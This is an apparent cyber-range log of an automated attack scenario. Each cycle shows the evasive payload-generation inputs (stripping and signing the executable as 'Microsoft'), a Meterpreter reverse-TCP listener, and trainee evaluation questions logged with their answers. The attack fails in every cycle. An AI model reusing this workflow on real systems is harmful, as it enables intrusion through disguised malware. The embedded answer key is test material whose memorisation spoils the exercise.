@@ -1,0 +1,220 @@
+2020-06-01 15:52:24,128- session-for-5ed4ddf2051e140dbc0be355 - INFO - Property Not Found
+2020-06-01 15:52:58,094- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Parsing Scenario....................
+2020-06-01 15:52:58,095- session-for-5ed4ddf2051e140dbc0be355 - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 4, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}]
+2020-06-01 15:52:58,096- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Check tools status*****************************
+2020-06-01 15:52:58,096- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible']
+2020-06-01 15:52:58,096- session-for-5ed4ddf2051e140dbc0be355 - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-06-01 15:52:58,096- session-for-5ed4ddf2051e140dbc0be355 - INFO - ansible = [32mTrue[0m
+2020-06-01 15:52:58,096- session-for-5ed4ddf2051e140dbc0be355 - INFO - msfconsole = [32mTrue[0m
+2020-06-01 15:52:58,097- session-for-5ed4ddf2051e140dbc0be355 - INFO - ansible = [32mTrue[0m
+2020-06-01 15:52:58,097- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Session Tactics**********************
+2020-06-01 15:52:58,105- session-for-5ed4ddf2051e140dbc0be355 - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 15:52:58,113- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 15:52:58,113- session-for-5ed4ddf2051e140dbc0be355 - INFO - Reason: payload generation
+2020-06-01 15:53:08,568- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 1
+2020-06-01 15:53:09,226- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:53:09,784- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:53:11,345- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert payload number: 3
+2020-06-01 15:53:11,502- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:53:11,658- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 15:53:11,710- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LPORT: 20651
+2020-06-01 15:53:11,763- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert output filename: session
+2020-06-01 15:53:12,315- session-for-5ed4ddf2051e140dbc0be355 - INFO - Add multiple processes behaviour: n
+2020-06-01 15:53:13,578- session-for-5ed4ddf2051e140dbc0be355 - INFO - Strip executable\?: y
+2020-06-01 15:53:15,141- session-for-5ed4ddf2051e140dbc0be355 - INFO - Sign executable\?: y
+2020-06-01 15:53:15,194- session-for-5ed4ddf2051e140dbc0be355 - INFO - use already existing certificate: y
+2020-06-01 15:53:15,248- session-for-5ed4ddf2051e140dbc0be355 - INFO - Select a Certificate: 1
+2020-06-01 15:53:15,301- session-for-5ed4ddf2051e140dbc0be355 - INFO - Insert sign software description: Microsoft
+2020-06-01 15:53:16,589- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:53:17,047- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 0
+2020-06-01 15:53:17,048- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:17,049- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 15:53:17,049- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 15:53:27,808- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:27,808- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 15:53:27,809- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 15:53:27,813- session-for-5ed4ddf2051e140dbc0be355 - INFO - No Exceptions Found
+2020-06-01 15:53:27,830- session-for-5ed4ddf2051e140dbc0be355 - INFO - post not needed
+2020-06-01 15:53:27,849- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LHOST'] not needed...
+2020-06-01 15:53:27,849- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LPORT'] not needed...
+2020-06-01 15:53:27,875- session-for-5ed4ddf2051e140dbc0be355 - INFO - cid: 5
+2020-06-01 15:53:27,875- session-for-5ed4ddf2051e140dbc0be355 - INFO - Starting Another Thread
+2020-06-01 15:53:27,876- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 15:53:29,541- metasploit-thread - INFO - {'job_id': 5, 'uuid': 'ejgrfxph'}
+2020-06-01 15:53:29,547- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:32,563- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:32,881- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:32,882- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending Generalize questions_answers
+2020-06-01 15:53:32,883- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending scenario-specific questions_answers
+2020-06-01 15:53:32,884- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Questions*****************************
+2020-06-01 15:53:32,884- session-for-5ed4ddf2051e140dbc0be355 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 15:53:32,885- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Actual Answers*****************************
+2020-06-01 15:53:32,885- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['192.168.18.61', 20651, '%USERPROFILE%\\Downloads\\', 'session']
+2020-06-01 15:53:32,894- session-for-5ed4ddf2051e140dbc0be355 - INFO - evaluation id:5ed4ddf2051e140dbc0be356
+2020-06-01 15:53:32,894- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 15:53:32,900- session-for-5ed4ddf2051e140dbc0be355 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 15:53:32,901- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 15:53:32,906- session-for-5ed4ddf2051e140dbc0be355 - INFO - command is session.exe
+2020-06-01 15:53:32,907- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 15:53:32,907- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Going 1 step back........................
+2020-06-01 15:53:32,915- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception Successfully Raised
+2020-06-01 15:53:32,915- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception caught
+2020-06-01 15:53:32,915- session-for-5ed4ddf2051e140dbc0be355 - INFO - No Exceptions Found
+2020-06-01 15:53:32,940- session-for-5ed4ddf2051e140dbc0be355 - INFO - post not needed
+2020-06-01 15:53:32,958- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LHOST'] not needed...
+2020-06-01 15:53:32,958- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LPORT'] not needed...
+2020-06-01 15:53:32,971- session-for-5ed4ddf2051e140dbc0be355 - INFO - cid: 6
+2020-06-01 15:53:32,971- session-for-5ed4ddf2051e140dbc0be355 - INFO - Starting Another Thread
+2020-06-01 15:53:32,971- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 15:53:34,633- metasploit-thread - INFO - {'job_id': 6, 'uuid': 'qujgj2fj'}
+2020-06-01 15:53:34,638- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:37,662- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:37,977- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:37,978- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending Generalize questions_answers
+2020-06-01 15:53:37,978- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending scenario-specific questions_answers
+2020-06-01 15:53:37,979- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Questions*****************************
+2020-06-01 15:53:37,979- session-for-5ed4ddf2051e140dbc0be355 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 15:53:37,980- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Actual Answers*****************************
+2020-06-01 15:53:37,980- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['192.168.18.61', 20651, '%USERPROFILE%\\Downloads\\', 'session']
+2020-06-01 15:53:37,995- session-for-5ed4ddf2051e140dbc0be355 - INFO - evaluation id:5ed4ddf2051e140dbc0be356
+2020-06-01 15:53:37,996- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 15:53:38,008- session-for-5ed4ddf2051e140dbc0be355 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 15:53:38,009- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 15:53:38,015- session-for-5ed4ddf2051e140dbc0be355 - INFO - command is session.exe
+2020-06-01 15:53:38,015- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 15:53:38,015- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Going 2 step back........................
+2020-06-01 15:53:38,023- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception Successfully Raised
+2020-06-01 15:53:38,023- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception caught
+2020-06-01 15:53:44,708- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:44,709- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 15:53:44,709- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 15:53:44,713- session-for-5ed4ddf2051e140dbc0be355 - INFO - No Exceptions Found
+2020-06-01 15:53:44,728- session-for-5ed4ddf2051e140dbc0be355 - INFO - post not needed
+2020-06-01 15:53:44,745- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LHOST'] not needed...
+2020-06-01 15:53:44,745- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LPORT'] not needed...
+2020-06-01 15:53:44,757- session-for-5ed4ddf2051e140dbc0be355 - INFO - cid: 7
+2020-06-01 15:53:44,757- session-for-5ed4ddf2051e140dbc0be355 - INFO - Starting Another Thread
+2020-06-01 15:53:44,758- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 15:53:46,425- metasploit-thread - INFO - {'job_id': 7, 'uuid': '9wws64iz'}
+2020-06-01 15:53:46,430- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:49,454- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:53:49,760- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:53:49,761- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending Generalize questions_answers
+2020-06-01 15:53:49,762- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending scenario-specific questions_answers
+2020-06-01 15:53:49,762- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Questions*****************************
+2020-06-01 15:53:49,763- session-for-5ed4ddf2051e140dbc0be355 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 15:53:49,763- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Actual Answers*****************************
+2020-06-01 15:53:49,764- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['192.168.18.61', 20651, '%USERPROFILE%\\Downloads\\', 'session']
+2020-06-01 15:53:49,770- session-for-5ed4ddf2051e140dbc0be355 - INFO - evaluation id:5ed4ddf2051e140dbc0be356
+2020-06-01 15:53:49,770- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 15:53:49,783- session-for-5ed4ddf2051e140dbc0be355 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 15:53:49,784- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 15:53:49,790- session-for-5ed4ddf2051e140dbc0be355 - INFO - command is session.exe
+2020-06-01 15:53:49,791- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 15:53:49,792- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Going 3 step back........................
+2020-06-01 15:53:49,799- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception Successfully Raised
+2020-06-01 15:53:49,800- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception caught
+2020-06-01 15:53:49,902- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 15:53:49,902- session-for-5ed4ddf2051e140dbc0be355 - INFO - Reason: payload generation
+2020-06-01 15:53:49,903- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['LPORT'] option not needed...
+2020-06-01 15:54:00,417- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 1
+2020-06-01 15:54:01,075- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:54:01,632- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:54:03,193- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert payload number: 3
+2020-06-01 15:54:03,349- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:54:03,506- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 15:54:03,557- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LPORT: 20651
+2020-06-01 15:54:03,609- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert output filename: session
+2020-06-01 15:54:04,161- session-for-5ed4ddf2051e140dbc0be355 - INFO - Add multiple processes behaviour: n
+2020-06-01 15:54:05,440- session-for-5ed4ddf2051e140dbc0be355 - INFO - Strip executable\?: y
+2020-06-01 15:54:07,002- session-for-5ed4ddf2051e140dbc0be355 - INFO - Sign executable\?: y
+2020-06-01 15:54:07,055- session-for-5ed4ddf2051e140dbc0be355 - INFO - use already existing certificate: y
+2020-06-01 15:54:07,107- session-for-5ed4ddf2051e140dbc0be355 - INFO - Select a Certificate: 1
+2020-06-01 15:54:07,158- session-for-5ed4ddf2051e140dbc0be355 - INFO - Insert sign software description: Microsoft
+2020-06-01 15:54:08,455- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:54:08,913- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 0
+2020-06-01 15:54:08,914- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:08,915- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 15:54:08,916- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 15:54:18,360- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:18,360- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 15:54:18,360- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 15:54:18,366- session-for-5ed4ddf2051e140dbc0be355 - INFO - No Exceptions Found
+2020-06-01 15:54:18,383- session-for-5ed4ddf2051e140dbc0be355 - INFO - post not needed
+2020-06-01 15:54:18,401- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LHOST'] not needed...
+2020-06-01 15:54:18,401- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LPORT'] not needed...
+2020-06-01 15:54:18,414- session-for-5ed4ddf2051e140dbc0be355 - INFO - cid: 8
+2020-06-01 15:54:18,414- session-for-5ed4ddf2051e140dbc0be355 - INFO - Starting Another Thread
+2020-06-01 15:54:18,414- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 15:54:20,234- metasploit-thread - INFO - {'job_id': 8, 'uuid': 'hso6atkd'}
+2020-06-01 15:54:20,240- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:54:23,252- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:54:23,419- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:23,421- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending Generalize questions_answers
+2020-06-01 15:54:23,421- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending scenario-specific questions_answers
+2020-06-01 15:54:23,422- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Questions*****************************
+2020-06-01 15:54:23,422- session-for-5ed4ddf2051e140dbc0be355 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 15:54:23,423- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Actual Answers*****************************
+2020-06-01 15:54:23,424- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['192.168.18.61', 20651, '%USERPROFILE%\\Downloads\\', 'session']
+2020-06-01 15:54:23,429- session-for-5ed4ddf2051e140dbc0be355 - INFO - evaluation id:5ed4ddf2051e140dbc0be356
+2020-06-01 15:54:23,430- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 15:54:23,435- session-for-5ed4ddf2051e140dbc0be355 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 15:54:23,435- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 15:54:23,441- session-for-5ed4ddf2051e140dbc0be355 - INFO - command is session.exe
+2020-06-01 15:54:23,442- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Exception Occured somewhere!!
+2020-06-01 15:54:23,442- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Going 4 step back........................
+2020-06-01 15:54:23,447- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception Successfully Raised
+2020-06-01 15:54:23,448- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception caught
+2020-06-01 15:54:23,550- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Spawning Phantom Evasion....................
+2020-06-01 15:54:23,551- session-for-5ed4ddf2051e140dbc0be355 - INFO - Reason: payload generation
+2020-06-01 15:54:23,551- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['LPORT'] option not needed...
+2020-06-01 15:54:34,068- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 1
+2020-06-01 15:54:34,726- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:54:35,285- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 2
+2020-06-01 15:54:36,846- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert payload number: 3
+2020-06-01 15:54:37,003- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:54:37,160- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LHOST: 192.168.18.61
+2020-06-01 15:54:37,212- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert LPORT: 20651
+2020-06-01 15:54:37,263- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert output filename: session
+2020-06-01 15:54:37,815- session-for-5ed4ddf2051e140dbc0be355 - INFO - Add multiple processes behaviour: n
+2020-06-01 15:54:39,065- session-for-5ed4ddf2051e140dbc0be355 - INFO - Strip executable\?: y
+2020-06-01 15:54:40,626- session-for-5ed4ddf2051e140dbc0be355 - INFO - Sign executable\?: y
+2020-06-01 15:54:40,678- session-for-5ed4ddf2051e140dbc0be355 - INFO - use already existing certificate: y
+2020-06-01 15:54:40,730- session-for-5ed4ddf2051e140dbc0be355 - INFO - Select a Certificate: 1
+2020-06-01 15:54:40,781- session-for-5ed4ddf2051e140dbc0be355 - INFO - Insert sign software description: Microsoft
+2020-06-01 15:54:42,068- session-for-5ed4ddf2051e140dbc0be355 - INFO - Press Enter to continue: 
+2020-06-01 15:54:42,525- session-for-5ed4ddf2051e140dbc0be355 - INFO - Please insert option: 0
+2020-06-01 15:54:42,526- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:42,527- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-06-01 15:54:42,527- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-06-01 15:54:51,572- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:51,573- session-for-5ed4ddf2051e140dbc0be355 - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-06-01 15:54:51,573- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-06-01 15:54:51,580- session-for-5ed4ddf2051e140dbc0be355 - INFO - No Exceptions Found
+2020-06-01 15:54:51,598- session-for-5ed4ddf2051e140dbc0be355 - INFO - post not needed
+2020-06-01 15:54:51,615- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LHOST'] not needed...
+2020-06-01 15:54:51,615- session-for-5ed4ddf2051e140dbc0be355 - INFO - exploit['LPORT'] not needed...
+2020-06-01 15:54:51,628- session-for-5ed4ddf2051e140dbc0be355 - INFO - cid: 9
+2020-06-01 15:54:51,628- session-for-5ed4ddf2051e140dbc0be355 - INFO - Starting Another Thread
+2020-06-01 15:54:51,628- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-06-01 15:54:53,305- metasploit-thread - INFO - {'job_id': 9, 'uuid': 'jvj3prly'}
+2020-06-01 15:54:53,310- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:54:56,333- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 15:54:56,634- session-for-5ed4ddf2051e140dbc0be355 - INFO - **************************Exploring Evaluation**********************
+2020-06-01 15:54:56,635- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending Generalize questions_answers
+2020-06-01 15:54:56,636- session-for-5ed4ddf2051e140dbc0be355 - INFO - Appending scenario-specific questions_answers
+2020-06-01 15:54:56,636- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Questions*****************************
+2020-06-01 15:54:56,637- session-for-5ed4ddf2051e140dbc0be355 - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
+2020-06-01 15:54:56,637- session-for-5ed4ddf2051e140dbc0be355 - INFO - *****************************Actual Answers*****************************
+2020-06-01 15:54:56,638- session-for-5ed4ddf2051e140dbc0be355 - INFO - ['192.168.18.61', 20651, '%USERPROFILE%\\Downloads\\', 'session']
+2020-06-01 15:54:56,644- session-for-5ed4ddf2051e140dbc0be355 - INFO - evaluation id:5ed4ddf2051e140dbc0be356
+2020-06-01 15:54:56,644- session-for-5ed4ddf2051e140dbc0be355 - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 15:54:56,650- session-for-5ed4ddf2051e140dbc0be355 - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-06-01 15:54:56,650- session-for-5ed4ddf2051e140dbc0be355 - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-06-01 15:54:56,656- session-for-5ed4ddf2051e140dbc0be355 - INFO - command is session.exe
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Ending Attack due to bulk of errors
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - CRITICAL - Final Exception, Execution Stopped for session id5ed4ddf2051e140dbc0be355
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception Successfully Raised
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - INFO - Exception caught
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................Destroying Session.....................................
+2020-06-01 15:54:56,657- session-for-5ed4ddf2051e140dbc0be355 - INFO - ....................No Session available to destroy........................
